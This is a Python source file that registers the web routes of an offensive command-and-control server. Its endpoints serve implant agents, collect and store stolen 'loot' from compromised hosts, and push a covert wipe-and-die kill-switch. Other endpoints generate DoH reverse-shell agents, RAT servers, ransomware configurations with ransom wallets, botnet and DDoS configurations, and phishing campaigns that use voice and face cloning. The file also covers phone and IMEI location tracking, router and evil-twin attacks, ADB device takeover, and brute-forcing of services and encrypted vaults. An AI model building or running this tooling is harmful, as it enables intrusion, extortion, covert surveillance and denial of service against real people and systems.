"""quantum.c2.routes — every C2 route (/s /r /ai /kill /federation /dash)."""
from __future__ import annotations

import base64
import json
import os
import threading
import time

from quantum.c2.app import FEDERATION, decrypt_beacon
from quantum.core.deps import Response, jsonify, request
from quantum.core.env import LOG_DIR, LOOT_DIR
from quantum.core.grayfish import GRAYFISH
from quantum.core.logging import MitreMapper, _tail_jsonl, log
from quantum.dash import DASH_HTML
from quantum.postexploit.harvest import auto_parse_loot
from quantum.postexploit.killswitch import KILLSWITCH, TASKQ, kill_all_implants


def register_routes(app, agents, API):

    @app.route("/s", defaults={"profile": "default"})
    @app.route("/s/<profile>")
    def s(profile):
        agent_text = agents.get(profile)
        if not agent_text: return "unknown profile", 404
        return agent_text, 200, {"Content-Type": "text/plain"}

    @app.route("/r", methods=["POST"])
    def r():
        d = request.json or {}
        host = d.get("host", "?")
        task, TASKQ[host] = TASKQ.get(host, {}), {}
        if d.get("data") and not d.get("k"):
            os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
            fn = os.path.join(LOOT_DIR, host, f"posix_drop_{int(time.time())}.txt")
            try: open(fn, "wb").write(base64.b64decode(d["data"]))
            except Exception: open(fn, "w").write(str(d["data"]))
            GRAYFISH.seal(fn)
            log(f"C2 posix loot {host} -> {fn}.gfy", "C2")
            return jsonify(task or {"act": "none"})
        if d.get("act") == "hb":
            # V3.1: keylogger buffer pull is automatic — if a kl.klq arrives, seal it
            log(f"C2 hb {host}; reply {task or 'none'}", "C2")
            threading.Thread(target=API.turbine.enroll,
                             args=(host, {"heartbeat": True}), daemon=True).start()
            return jsonify(task or {"act": "none"})
        try: blob = decrypt_beacon(d)
        except Exception as e:
            log(f"decrypt fail {host}: {e}", "ERR"); return jsonify({"act": "none"})
        os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
        fn = os.path.join(LOOT_DIR, host, f"drop_{int(time.time())}.zip")
        open(fn, "wb").write(blob)
        log(f"C2 loot {host}: {len(blob)} bytes", "C2")
        auto_parse_loot(host, fn)
        GRAYFISH.seal(fn)
        return jsonify(task or {"act": "none"})

    @app.route("/ai", methods=["POST"])
    def ai_api():
        d = request.json or {}
        return jsonify(API.handle(d.get("cmd", ""), d.get("params", {})))

    @app.route("/kill", methods=["POST"])
    def kill_switch():
        """V3.1: covert kill-switch — sets wipe/die tasks on every implant queue
        (delivery rides each implant's own encrypted beacon pull)."""
        arm = (request.json or {}).get("arm", True)
        if arm:
            return jsonify(kill_all_implants(wipe_first=(request.json or {}).get("wipe", True)))
        KILLSWITCH["on"] = False
        return jsonify({"killed": [], "note": "kill-switch disarmed"})

    @app.route("/federation/reg", methods=["GET", "POST"])
    def fed_reg():
        if request.method == "POST":
            remote = (request.json or {}).get("implants", {})
            with API.turbine.lock:
                for h, rec in remote.items():
                    if h not in API.turbine.implants: API.turbine.implants[h] = rec
        return jsonify({"implants": API.turbine.implants, "onion": FEDERATION.onion})

    @app.route("/federation/peer", methods=["POST"])
    def fed_peer():
        onion = (request.json or {}).get("onion")
        if onion and onion not in FEDERATION.peers:
            FEDERATION.peers.append(onion)
            open(os.path.join(LOG_DIR, "federation", "peers.json"), "w").write(json.dumps(FEDERATION.peers))
            log(f"FEDERATION: new peer {onion}", "FED")
        return jsonify({"peers": FEDERATION.peers})

    @app.route("/dash")
    def dash():
        return Response(DASH_HTML, mimetype="text/html")

    @app.route("/dash/api/state")
    def dash_state():
        return jsonify({
            "decisions": _tail_jsonl(os.path.join(LOG_DIR, "decisions.jsonl"), 100),
            "audit":     _tail_jsonl(os.path.join(LOG_DIR, "audit.jsonl"), 200),
            "mitre":     MitreMapper().map_audit().get("coverage", []),
            "killswitch": KILLSWITCH["on"],
        })

    # ---- Unique Listener Deployment ----
    @app.route("/api/listener/deploy", methods=["POST"])
    def listener_deploy():
        from quantum.c2.listener import ListenerManager
        d = request.json or {}
        mgr = ListenerManager()
        listener = mgr.deploy(
            name=d.get("name", f"engagement-{int(time.time())}"),
            target=d.get("target", "unknown"),
            exploit_type=d.get("exploit", "unknown"),
            payload_path=d.get("payload"),
            port=d.get("port"),
        )
        if listener:
            return jsonify(listener.status())
        return jsonify({"error": "deploy failed"}), 500

    @app.route("/api/listener/stop", methods=["POST"])
    def listener_stop():
        from quantum.c2.listener import ListenerManager
        d = request.json or {}
        port = d.get("port")
        if not port:
            return jsonify({"error": "port required"}), 400
        mgr = ListenerManager()
        ok = mgr.stop(port)
        return jsonify({"stopped": ok, "port": port})

    @app.route("/api/listener/stopall", methods=["POST"])
    def listener_stopall():
        from quantum.c2.listener import ListenerManager
        mgr = ListenerManager()
        mgr.stop_all()
        return jsonify({"stopped": "all"})

    @app.route("/api/listeners")
    def listener_list():
        from quantum.c2.listener import ListenerManager
        mgr = ListenerManager()
        return jsonify(mgr.list_all())

    @app.route("/api/listeners/active")
    def listener_active():
        from quantum.c2.listener import ListenerManager
        mgr = ListenerManager()
        return jsonify(mgr.get_active())

    @app.route("/api/listener/hits")
    def listener_hits():
        from quantum.c2.listener import ListenerManager
        port = request.args.get("port")
        if not port:
            return jsonify({"error": "port required"}), 400
        mgr = ListenerManager()
        return jsonify(mgr.get_hits(port))

    # ---- DoH Reverse Shell ----
    @app.route("/api/dohshell/agent/posix")
    def dohshell_agent_posix():
        from quantum.c2.reverseshell import generate_doh_reverse_shell_agent
        domain = request.args.get("domain", "c2.example.com")
        c2_host = request.args.get("c2", "192.168.1.1:8443")
        fn = generate_doh_reverse_shell_agent(domain, c2_host)
        with open(fn, encoding="utf-8") as f:
            return f.read(), 200, {"Content-Type": "text/plain"}

    @app.route("/api/dohshell/agent/windows")
    def dohshell_agent_windows():
        from quantum.c2.reverseshell import generate_windows_doh_reverse_shell
        domain = request.args.get("domain", "c2.example.com")
        c2_host = request.args.get("c2", "192.168.1.1:8443")
        fn = generate_windows_doh_reverse_shell(domain, c2_host)
        with open(fn, encoding="utf-8") as f:
            return f.read(), 200, {"Content-Type": "text/plain"}

    @app.route("/api/dohshell/targets")
    def dohshell_targets():
        from quantum.c2.reverseshell import DoHBeaconReceiver
        domain = request.args.get("domain", "c2.example.com")
        receiver = DoHBeaconReceiver(domain)
        return jsonify(receiver.get_active_targets())

    @app.route("/api/dohshell/task", methods=["POST"])
    def dohshell_task():
        from quantum.c2.reverseshell import DoHBeaconReceiver
        d = request.json or {}
        domain = d.get("domain", "c2.example.com")
        host_id = d.get("host_id", "hq")
        command = d.get("command", "shell")
        params = d.get("params", {})
        receiver = DoHBeaconReceiver(domain)
        task = receiver.push_task(host_id, command, params)
        return jsonify(task)

    @app.route("/api/dohshell/config")
    def dohshell_config():
        from quantum.c2.reverseshell import generate_android_c2_config
        domain = request.args.get("domain", "c2.example.com")
        return jsonify(generate_android_c2_config(domain))

    # ---- OSINT Trackers ----
    @app.route("/api/osint/ip/<ip>")
    def osint_ip(ip):
        from quantum.recon.trackers import track_ip_downloads
        return jsonify(track_ip_downloads(ip))

    @app.route("/api/osint/imei/<imei>")
    def osint_imei(imei):
        from quantum.recon.trackers import track_imei
        return jsonify(track_imei(imei))

    @app.route("/api/osint/phone/<phone>")
    def osint_phone(phone):
        from quantum.recon.trackers import track_phone_location
        return jsonify(track_phone_location(phone))

    # ---- RAT Dashboard ----
    @app.route("/api/rat/repos")
    def rat_repos():
        from quantum.control.rat import list_rat_repos
        return jsonify(list_rat_repos())

    @app.route("/api/rat/generate", methods=["POST"])
    def rat_generate():
        from quantum.control.rat import generate_rat_server
        d = request.json or {}
        return jsonify(generate_rat_server(
            d.get("repo", "sliver"),
            d.get("host", "0.0.0.0"),
            d.get("port", 8443),
            d.get("password"),
        ))

    @app.route("/api/rat/features")
    def rat_features():
        from quantum.control.rat import mspy_feature_list, messaging_app_list
        return jsonify({"features": mspy_feature_list(), "messaging_apps": messaging_app_list()})

    @app.route("/api/rat/state")
    def rat_state():
        from quantum.control.rat import rat_dashboard_state
        return jsonify(rat_dashboard_state())

    # ---- Ransomware ----
    @app.route("/api/ransomware/tools")
    def ransomware_tools():
        from quantum.control.ransomware import list_ransomware_tools
        return jsonify(list_ransomware_tools())

    @app.route("/api/ransomware/modules")
    def ransomware_modules():
        from quantum.control.ransomware import list_deployment_modules
        return jsonify(list_deployment_modules())

    @app.route("/api/ransomware/generate", methods=["POST"])
    def ransomware_generate():
        from quantum.control.ransomware import generate_ransomware_config
        d = request.json or {}
        return jsonify(generate_ransomware_config(
            d.get("tool", "lockbit"),
            d.get("target_os", "Windows"),
            d.get("encryption", "AES-256-GCM"),
            d.get("ransom_amount", 1000.0),
            d.get("wallet_address"),
            d.get("contact_email"),
        ))

    @app.route("/api/ransomware/state")
    def ransomware_state():
        from quantum.control.ransomware import ransomware_dashboard_state
        return jsonify(ransomware_dashboard_state())

    # ---- Botnet ----
    @app.route("/api/botnet/types")
    def botnet_types():
        from quantum.control.botnet import list_botnet_types
        return jsonify(list_botnet_types())

    @app.route("/api/botnet/capabilities")
    def botnet_capabilities():
        from quantum.control.botnet import list_botnet_capabilities
        return jsonify(list_botnet_capabilities())

    @app.route("/api/botnet/generate", methods=["POST"])
    def botnet_generate():
        from quantum.control.botnet import generate_botnet_config
        d = request.json or {}
        return jsonify(generate_botnet_config(
            d.get("type", "irc"),
            d.get("c2_host", "0.0.0.0"),
            d.get("c2_port", 6667),
            d.get("max_bots", 1000),
        ))

    @app.route("/api/botnet/state")
    def botnet_state():
        from quantum.control.botnet import botnet_dashboard_state
        return jsonify(botnet_dashboard_state())

    # ---- DDoS ----
    @app.route("/api/ddos/tools")
    def ddos_tools():
        from quantum.control.ddos import list_ddos_tools
        return jsonify(list_ddos_tools())

    @app.route("/api/ddos/techniques")
    def ddos_techniques():
        from quantum.control.ddos import list_ddos_techniques
        return jsonify(list_ddos_techniques())

    @app.route("/api/ddos/generate", methods=["POST"])
    def ddos_generate():
        from quantum.control.ddos import generate_ddos_config
        d = request.json or {}
        return jsonify(generate_ddos_config(
            d.get("tool", "loris"),
            d.get("target", ""),
            d.get("port", 80),
            d.get("threads", 100),
            d.get("duration", 60),
        ))

    @app.route("/api/ddos/state")
    def ddos_state():
        from quantum.control.ddos import ddos_dashboard_state
        return jsonify(ddos_dashboard_state())

    # ---- Messaging / Social Engineering ----
    @app.route("/api/messaging/platforms")
    def messaging_platforms():
        from quantum.social.messaging import list_messaging_platforms
        return jsonify(list_messaging_platforms())

    @app.route("/api/messaging/techniques")
    def messaging_techniques():
        from quantum.social.messaging import list_social_engineering_techniques
        return jsonify(list_social_engineering_techniques())

    @app.route("/api/messaging/voice_clone")
    def messaging_voice_clone():
        from quantum.social.messaging import list_voice_clone_providers
        return jsonify(list_voice_clone_providers())

    @app.route("/api/messaging/face_clone")
    def messaging_face_clone():
        from quantum.social.messaging import list_face_clone_providers
        return jsonify(list_face_clone_providers())

    @app.route("/api/messaging/campaign", methods=["POST"])
    def messaging_campaign():
        from quantum.social.messaging import generate_social_engineering_campaign
        d = request.json or {}
        return jsonify(generate_social_engineering_campaign(
            d.get("platform", "whatsapp"),
            d.get("technique", "phishing"),
            d.get("target", ""),
            d.get("ai_provider", "abliteratus"),
        ))

    @app.route("/api/messaging/state")
    def messaging_state():
        from quantum.social.messaging import messaging_dashboard_state
        return jsonify(messaging_dashboard_state())

    # ---- Steganography ----
    @app.route("/api/stego/methods")
    def stego_methods():
        from quantum.exploits.steganography import list_steganography_methods
        return jsonify(list_steganography_methods())

    @app.route("/api/stego/pdf_exploits")
    def stego_pdf_exploits():
        from quantum.exploits.steganography import list_pdf_exploit_methods
        return jsonify(list_pdf_exploit_methods())

    @app.route("/api/stego/messenger_chains")
    def stego_messenger_chains():
        from quantum.exploits.steganography import list_messenger_parse_chains
        return jsonify(list_messenger_parse_chains())

    @app.route("/api/stego/state")
    def stego_state():
        from quantum.exploits.steganography import steganography_dashboard_state
        return jsonify(steganography_dashboard_state())

    # ---- Advanced Payloads (zero-click, reverse shell, downloader, joiner, security disable) ----
    @app.route("/api/payload/advanced", methods=["POST"])
    def payload_advanced():
        from quantum.exploits.advanced_payloads import generate_advanced_payload
        d = request.json or {}
        return jsonify(generate_advanced_payload(
            kind=d.get("kind", "zero_click_pdf"),
            payload_text=d.get("payload_text", ""),
            output_path=d.get("output_path"),
            disable_security=bool(d.get("disable_security")),
            downloader_url=d.get("downloader_url"),
            reverse_shell_host=d.get("reverse_shell_host"),
        ))

    # ---- Router Exploits ----
    @app.route("/api/router/vulnerabilities")
    def router_vulnerabilities():
        from quantum.exploits.router import list_router_vulnerabilities
        return jsonify(list_router_vulnerabilities())

    @app.route("/api/router/default_creds")
    def router_default_creds():
        from quantum.exploits.router import list_default_credentials
        return jsonify(list_default_credentials())

    @app.route("/api/router/attack_methods")
    def router_attack_methods():
        from quantum.exploits.router import list_router_attack_methods
        return jsonify(list_router_attack_methods())

    @app.route("/api/router/scan", methods=["POST"])
    def router_scan():
        from quantum.exploits.router import scan_router
        d = request.json or {}
        return jsonify(scan_router(d.get("ip", ""), d.get("port", 80)))

    @app.route("/api/router/generate", methods=["POST"])
    def router_generate():
        from quantum.exploits.router import generate_router_attack_config
        d = request.json or {}
        return jsonify(generate_router_attack_config(
            d.get("method", "default_creds"),
            d.get("target", ""),
            d.get("port", 80),
        ))

    @app.route("/api/router/state")
    def router_state():
        from quantum.exploits.router import router_dashboard_state
        return jsonify(router_dashboard_state())

    # ---- APN Attacks ----
    @app.route("/api/apn/hardware")
    def apn_hardware():
        from quantum.exploits.apn import list_apn_hardware
        return jsonify(list_apn_hardware())

    @app.route("/api/apn/methods")
    def apn_methods():
        from quantum.exploits.apn import list_apn_attack_methods
        return jsonify(list_apn_attack_methods())

    @app.route("/api/apn/scan_beacons", methods=["POST"])
    def apn_scan_beacons():
        from quantum.exploits.apn import scan_beacons
        d = request.json or {}
        return jsonify(scan_beacons(d.get("interface", "wlan0")))

    @app.route("/api/apn/generate", methods=["POST"])
    def apn_generate():
        from quantum.exploits.apn import generate_apn_attack_config
        d = request.json or {}
        return jsonify(generate_apn_attack_config(
            d.get("method", "evil_twin"),
            d.get("hardware", "wifi_pineapple"),
            d.get("target"),
        ))

    @app.route("/api/apn/state")
    def apn_state():
        from quantum.exploits.apn import apn_dashboard_state
        return jsonify(apn_dashboard_state())

    # ---- EXIF Analysis ----
    @app.route("/api/exif/analyze", methods=["POST"])
    def exif_analyze():
        from quantum.recon.exif import analyze_exif
        d = request.json or {}
        return jsonify(analyze_exif(d.get("image_path", "")))

    @app.route("/api/exif/state")
    def exif_state():
        from quantum.recon.exif import exif_dashboard_state
        return jsonify(exif_dashboard_state())

    # ---- Dark Web ----
    @app.route("/api/darkweb/services")
    def darkweb_services():
        from quantum.markets.darkweb import list_onion_services
        return jsonify(list_onion_services())

    @app.route("/api/darkweb/state")
    def darkweb_state():
        from quantum.markets.darkweb import darkweb_dashboard_state
        return jsonify(darkweb_dashboard_state())

    # ---- Google Dorks ----
    @app.route("/api/dorks/categories")
    def dorks_categories():
        from quantum.recon.dorks import list_dork_categories
        return jsonify(list_dork_categories())

    @app.route("/api/dorks/state")
    def dorks_state():
        from quantum.recon.dorks import dorks_dashboard_state
        return jsonify(dorks_dashboard_state())

    # ---- Shodan ----
    @app.route("/api/shodan/presets")
    def shodan_presets():
        from quantum.recon.shodan import list_shodan_presets
        return jsonify(list_shodan_presets())

    @app.route("/api/shodan/search", methods=["POST"])
    def shodan_search():
        from quantum.recon.shodan import shodan_search
        d = request.json or {}
        return jsonify(shodan_search(d.get("query", ""), d.get("api_key"), d.get("limit", 100)))

    @app.route("/api/shodan/host/<ip>")
    def shodan_host(ip):
        from quantum.recon.shodan import shodan_host_info
        return jsonify(shodan_host_info(ip))

    @app.route("/api/shodan/state")
    def shodan_state():
        from quantum.recon.shodan import shodan_dashboard_state
        return jsonify(shodan_dashboard_state())

    # ---- 2D Map ----
    @app.route("/api/map2d/data", methods=["POST"])
    def map2d_data():
        from quantum.control.map2d import generate_map_data
        d = request.json or {}
        return jsonify(generate_map_data(d.get("beacons", [])))

    @app.route("/api/map2d/state")
    def map2d_state():
        from quantum.control.map2d import map2d_dashboard_state
        return jsonify(map2d_dashboard_state())

    # ---- PhantomDroid ADB ----
    @app.route("/api/phantomdroid/features")
    def phantomdroid_features():
        from quantum.control.phantomdroid import list_phantomdroid_features
        return jsonify(list_phantomdroid_features())

    @app.route("/api/phantomdroid/devices")
    def phantomdroid_devices():
        from quantum.control.phantomdroid import discover_adb_devices
        return jsonify(discover_adb_devices())

    @app.route("/api/phantomdroid/connect", methods=["POST"])
    def phantomdroid_connect():
        from quantum.control.phantomdroid import connect_adb_wireless
        d = request.json or {}
        return jsonify(connect_adb_wireless(d.get("ip", ""), d.get("port", 5555)))

    @app.route("/api/phantomdroid/shell", methods=["POST"])
    def phantomdroid_shell():
        from quantum.control.phantomdroid import adb_shell
        d = request.json or {}
        return jsonify(adb_shell(d.get("serial", ""), d.get("command", "")))

    @app.route("/api/phantomdroid/screencap", methods=["POST"])
    def phantomdroid_screencap():
        from quantum.control.phantomdroid import adb_screencap
        d = request.json or {}
        return jsonify(adb_screencap(d.get("serial", ""), d.get("output_path", "")))

    @app.route("/api/phantomdroid/device_info", methods=["POST"])
    def phantomdroid_device_info():
        from quantum.control.phantomdroid import adb_get_device_info
        d = request.json or {}
        return jsonify(adb_get_device_info(d.get("serial", "")))

    @app.route("/api/phantomdroid/state")
    def phantomdroid_state():
        from quantum.control.phantomdroid import phantomdroid_dashboard_state
        return jsonify(phantomdroid_dashboard_state())

    # ---- real hardware probes: bluetooth / hid / sdr / imsi ----
    # The /state endpoints for these live further down with the rest of
    # the hardware block; these are the probe sub-actions.
    @app.route("/api/bluetooth/scan")
    def bluetooth_scan():
        from quantum.control.bluetooth import scan_devices
        return jsonify(scan_devices())

    @app.route("/api/hid/raw")
    def hid_raw_devices_route():
        from quantum.control.hid import hid_raw_devices
        return jsonify(hid_raw_devices())

    @app.route("/api/sdr/probe")
    def sdr_probe_route():
        from quantum.control.sdr import probe_radios
        return jsonify(probe_radios())

    @app.route("/api/imsi/read", methods=["POST"])
    def imsi_read_route():
        from quantum.control.imsi import read_imsi
        d = request.json or {}
        return jsonify(read_imsi(d.get("modem", "")))

    # ---- OSINT vendors: Intelligence X / ShadowDragon / DarkOwl ----
    @app.route("/api/osint/intelx/state")
    def osint_intelx_state():
        from quantum.recon.intelx import intelx_dashboard_state_full
        return jsonify(intelx_dashboard_state_full())

    @app.route("/api/osint/intelx/tools")
    def osint_intelx_tools():
        from quantum.recon.intelx import intelx_tools
        return jsonify(intelx_tools())

    @app.route("/api/osint/intelx/recent")
    def osint_intelx_recent():
        from quantum.recon.intelx import intelx_recent_queries
        return jsonify(intelx_recent_queries(
            int(request.args.get("limit", 20))))

    @app.route("/api/osint/intelx/search", methods=["POST"])
    def osint_intelx_search():
        from quantum.recon.intelx import intelx_search
        d = request.json or {}
        return jsonify(intelx_search(
            d.get("query", ""), d.get("api_key"),
            d.get("maxresults", 100), d.get("terminate", "date"),
            d.get("timeout", 5000), d.get("buckets"), d.get("media", 0)))

    @app.route("/api/osint/intelx/phonebook", methods=["POST"])
    def osint_intelx_phonebook():
        from quantum.recon.intelx import intelx_phonebook
        d = request.json or {}
        return jsonify(intelx_phonebook(
            d.get("value", ""), d.get("api_key"),
            d.get("limit", 100)))

    @app.route("/api/osint/shadowdragon/state")
    def osint_shadowdragon_state():
        from quantum.recon.shadowdragon import shadowdragon_dashboard_state
        return jsonify(shadowdragon_dashboard_state())

    @app.route("/api/osint/shadowdragon/matrix")
    def osint_shadowdragon_matrix():
        from quantum.recon.shadowdragon import shadowdragon_source_matrix
        return jsonify(shadowdragon_source_matrix())

    @app.route("/api/osint/shadowdragon/products")
    def osint_shadowdragon_products():
        from quantum.recon.shadowdragon import shadowdragon_products
        return jsonify(shadowdragon_products())

    @app.route("/api/osint/shadowdragon/license")
    def osint_shadowdragon_license():
        from quantum.recon.shadowdragon import shadowdragon_license_status
        return jsonify(shadowdragon_license_status())

    @app.route("/api/osint/shadowdragon/plan", methods=["POST"])
    def osint_shadowdragon_plan():
        from quantum.recon.shadowdragon import shadowdragon_query_plan
        d = request.json or {}
        return jsonify(shadowdragon_query_plan(
            d.get("subject_type", "name"), d.get("subject_value", "")))

    @app.route("/api/osint/darkowl/state")
    def osint_darkowl_state():
        from quantum.recon.darkowl import darkowl_dashboard_state
        return jsonify(darkowl_dashboard_state())

    @app.route("/api/osint/darkowl/search", methods=["POST"])
    def osint_darkowl_search():
        from quantum.recon.darkowl import darkowl_search
        d = request.json or {}
        return jsonify(darkowl_search(
            d.get("query", ""), d.get("public_key"),
            d.get("private_key"), d.get("extra_params")))

    @app.route("/api/osint/darkowl/test", methods=["POST"])
    def osint_darkowl_test():
        from quantum.recon.darkowl import darkowl_test
        d = request.json or {}
        return jsonify(darkowl_test(
            d.get("public_key"), d.get("private_key")))

    @app.route("/api/osint/darkowl/entity/<etype>/<value>", methods=["POST"])
    def osint_darkowl_entity(etype, value):
        from quantum.recon.darkowl import darkowl_entity
        d = request.json or {}
        return jsonify(darkowl_entity(
            etype, value, d.get("public_key"), d.get("private_key")))

    # ---- Password cracking: hashes ----
    @app.route("/api/crack/formats")
    def crack_formats():
        from quantum.brute.hashes import cracking_dashboard_state
        return jsonify(cracking_dashboard_state()["formats"])

    @app.route("/api/crack/hash/state")
    def crack_hash_state():
        from quantum.brute.hashes import (cracking_dashboard_state,
                                          cracking_recent_runs)
        state = cracking_dashboard_state()
        state["recent"] = cracking_recent_runs()
        return jsonify(state)

    @app.route("/api/crack/hash", methods=["POST"])
    def crack_hash():
        from quantum.brute.hashes import crack_hashes
        d = request.json or {}
        res = crack_hashes(d.get("targets", []), d.get("wordlist", []),
                           d.get("fmt", "md5"), d.get("salt"))
        log(f"CRACK hash dict fmt={d.get('fmt', 'md5')} "
            f"tried={res.get('tried', 0)} hits={len(res.get('hits', []))}",
            "CRACK")
        return jsonify(res)

    @app.route("/api/crack/hash/brute", methods=["POST"])
    def crack_hash_brute():
        from quantum.brute.hashes import brute_force_hashes
        d = request.json or {}
        res = brute_force_hashes(
            d.get("targets", []), d.get("fmt", "md5"), d.get("salt"),
            d.get("min_len", 1), d.get("max_len", 4),
            d.get("charset"))
        log(f"CRACK hash brute fmt={d.get('fmt', 'md5')} "
            f"tried={res.get('tried', 0)} hits={len(res.get('hits', []))}",
            "CRACK")
        return jsonify(res)

    @app.route("/api/crack/hash/identify", methods=["POST"])
    def crack_hash_identify():
        from quantum.brute.hashes import identify_hash
        d = request.json or {}
        return jsonify({"hash": d.get("hash", ""),
                        "formats": identify_hash(d.get("hash", ""))})

    @app.route("/api/crack/hashcat", methods=["POST"])
    def crack_hashcat():
        from quantum.brute.hashes import hashcat_run
        d = request.json or {}
        try:
            return jsonify(hashcat_run(
                d.get("hash_path", ""), d.get("wordlist"),
                d.get("fmt", "md5"), d.get("attack", 0),
                d.get("rules"), d.get("mask"),
                d.get("workload", "low"), d.get("session"),
                d.get("pot_path"), d.get("extra"),
                d.get("timeout", 300)))
        except ValueError as e:
            return jsonify({"error": str(e)}), 400

    @app.route("/api/crack/john", methods=["POST"])
    def crack_john():
        from quantum.brute.hashes import john_run
        d = request.json or {}
        return jsonify(john_run(
            d.get("hash_path", ""), d.get("wordlist"),
            d.get("fmt"), d.get("rules"), d.get("session"),
            d.get("extra"), d.get("timeout", 300)))

    @app.route("/api/crack/john/show", methods=["POST"])
    def crack_john_show():
        from quantum.brute.hashes import john_show
        d = request.json or {}
        return jsonify(john_show(
            d.get("hash_path", ""), d.get("fmt"), d.get("session")))

    @app.route("/api/crack/sam", methods=["POST"])
    def crack_sam():
        from quantum.brute.hashes import parse_pwdump
        d = request.json or {}
        return jsonify(parse_pwdump(d.get("text", "")))

    # ---- Password cracking: services ----
    @app.route("/api/crack/service/state")
    def crack_service_state():
        from quantum.brute.services import services_dashboard_state
        return jsonify(services_dashboard_state())

    @app.route("/api/crack/service", methods=["POST"])
    def crack_service():
        from quantum.brute import services as _svc
        d = request.json or {}
        service = (d.get("service") or "").lower()
        fn = {"ftp": _svc.brute_ftp, "http_basic": _svc.brute_http_basic,
              "http_form": _svc.brute_http_form, "telnet": _svc.brute_telnet,
              "smtp": _svc.brute_smtp_auth, "pop3": _svc.brute_pop3,
              "ssh": _svc.brute_ssh}.get(service)
        if fn is None:
            return jsonify({"error": f"unknown service {service!r} "
                                     "(ftp|http_basic|http_form|telnet|"
                                     "smtp|pop3|ssh)"}), 400
        host = d.get("host") or d.get("target") or d.get("url", "")
        res = fn(host, d.get("port") or
                 {"ftp": 21, "http_basic": 80, "http_form": 80,
                  "telnet": 23, "smtp": 25, "pop3": 110,
                  "ssh": 22}[service],
                 d.get("users"), d.get("wordlist", []),
                 d.get("timeout", 5))
        return jsonify(res)

    @app.route("/api/crack/hydra", methods=["POST"])
    def crack_hydra():
        from quantum.brute.services import hydra_run
        d = request.json or {}
        try:
            return jsonify(hydra_run(
                d.get("target", ""), d.get("protocol", "ssh"),
                d.get("user"), d.get("user_list"), d.get("wordlist"),
                d.get("port"), d.get("threads", 16),
                d.get("verbose", False), d.get("extra"),
                d.get("timeout", 600)))
        except ValueError as e:
            return jsonify({"error": str(e)}), 400

    # ---- Password cracking: vaults ----
    @app.route("/api/crack/vault/state")
    def crack_vault_state():
        from quantum.brute.vaults import vaults_dashboard_state
        return jsonify(vaults_dashboard_state())

    @app.route("/api/crack/vault/recent")
    def crack_vault_recent():
        from quantum.brute.vaults import vault_recent_runs
        return jsonify(vault_recent_runs(
            int(request.args.get("limit", 20))))

    @app.route("/api/crack/vault", methods=["POST"])
    def crack_vault():
        from quantum.brute.vaults import (
            archive_password_check, cryptomator_masterkey_check,
            truecrypt_test_password, veracrypt_test_password)
        import os as _os
        d = request.json or {}
        target, password = d.get("target", ""), d.get("password", "")
        kind = (d.get("kind") or "auto").lower()
        if kind == "cryptomator":
            if _os.path.isfile(str(target)):
                with open(target, encoding="utf-8") as fh:
                    target = fh.read()
            try:
                import json as _json
                mk = _json.loads(target) if isinstance(target, str) \
                    else target
            except Exception as e:
                return jsonify({"ok": False,
                                "error": f"bad masterkey JSON: {e}"}), 400
            return jsonify(cryptomator_masterkey_check(mk, password))
        if kind == "veracrypt":
            return jsonify(veracrypt_test_password(
                target, password, d.get("pim"), d.get("prf", "sha512")))
        if kind == "truecrypt":
            return jsonify(truecrypt_test_password(target, password))
        return jsonify(archive_password_check(target, password))

    @app.route("/api/crack/vault/brute", methods=["POST"])
    def crack_vault_brute():
        from quantum.brute.vaults import vault_brute_force
        d = request.json or {}
        return jsonify(vault_brute_force(
            d.get("target", ""), d.get("wordlist", []),
            d.get("kind", "auto"), d.get("prf", "sha512"),
            d.get("pim")))

    @app.route("/api/crack/state")
    def crack_state():
        from quantum.brute.hashes import (cracking_dashboard_state,
                                          cracking_recent_runs)
        from quantum.brute.services import services_dashboard_state
        from quantum.brute.vaults import (vault_recent_runs,
                                          vaults_dashboard_state)
        return jsonify({"hashes": cracking_dashboard_state(),
                        "hash_runs": cracking_recent_runs(),
                        "services": services_dashboard_state(),
                        "vaults": vaults_dashboard_state(),
                        "vault_runs": vault_recent_runs()})

    # ---- Agents / skills / commands / tasks / workflows console ----
    @app.route("/api/console/agents", methods=["GET", "POST"])
    def console_agents():
        from quantum.ai.console import list_agents, save_agent
        if request.method == "POST":
            d = request.json or {}
            return jsonify(save_agent(d))
        return jsonify(list_agents())

    @app.route("/api/console/agents/<agent_id>",
               methods=["GET", "PUT", "DELETE"])
    def console_agent(agent_id):
        from quantum.ai.console import (delete_agent, get_agent,
                                        save_agent)
        if request.method == "DELETE":
            return jsonify(delete_agent(agent_id))
        if request.method == "PUT":
            d = request.json or {}
            d["id"] = agent_id
            return jsonify(save_agent(d))
        agent = get_agent(agent_id)
        if agent is None or "error" in agent:
            return jsonify({"error": f"unknown agent: {agent_id}"}), 404
        return jsonify(agent)

    @app.route("/api/console/agents/deploy", methods=["POST"])
    def console_agent_deploy():
        from quantum.ai.console import deploy_agent
        d = request.json or {}
        if not d.get("agent_id"):
            return jsonify({"error": "agent_id required"}), 400
        return jsonify(deploy_agent(d["agent_id"]))

    @app.route("/api/console/skills", methods=["GET", "POST"])
    def console_skills():
        from quantum.ai.console import list_skills, save_skill
        if request.method == "POST":
            return jsonify(save_skill(request.json or {}))
        return jsonify(list_skills())

    @app.route("/api/console/skills/<skill_id>",
               methods=["GET", "PUT", "DELETE"])
    def console_skill(skill_id):
        from quantum.ai.console import (delete_skill, get_skill,
                                        save_skill)
        if request.method == "DELETE":
            return jsonify(delete_skill(skill_id))
        if request.method == "PUT":
            d = request.json or {}
            d["id"] = skill_id
            return jsonify(save_skill(d))
        skill = get_skill(skill_id)
        if skill is None or "error" in skill:
            return jsonify({"error": f"unknown skill: {skill_id}"}), 404
        return jsonify(skill)

    @app.route("/api/console/workflows", methods=["GET", "POST"])
    def console_workflows():
        from quantum.ai.console import list_workflows, save_workflow
        if request.method == "POST":
            return jsonify(save_workflow(request.json or {}))
        return jsonify(list_workflows())

    @app.route("/api/console/workflows/<workflow_id>",
               methods=["GET", "PUT", "DELETE"])
    def console_workflow(workflow_id):
        from quantum.ai.console import (delete_workflow, get_workflow,
                                        save_workflow)
        if request.method == "DELETE":
            return jsonify(delete_workflow(workflow_id))
        if request.method == "PUT":
            d = request.json or {}
            d["id"] = workflow_id
            return jsonify(save_workflow(d))
        flow = get_workflow(workflow_id)
        if flow is None or "error" in flow:
            return jsonify({"error":
                            f"unknown workflow: {workflow_id}"}), 404
        return jsonify(flow)

    @app.route("/api/console/workflows/<workflow_id>/run",
               methods=["POST"])
    def console_workflow_run(workflow_id):
        from quantum.ai.console import run_workflow
        d = request.json or {}
        return jsonify(run_workflow(workflow_id, d.get("variables")))

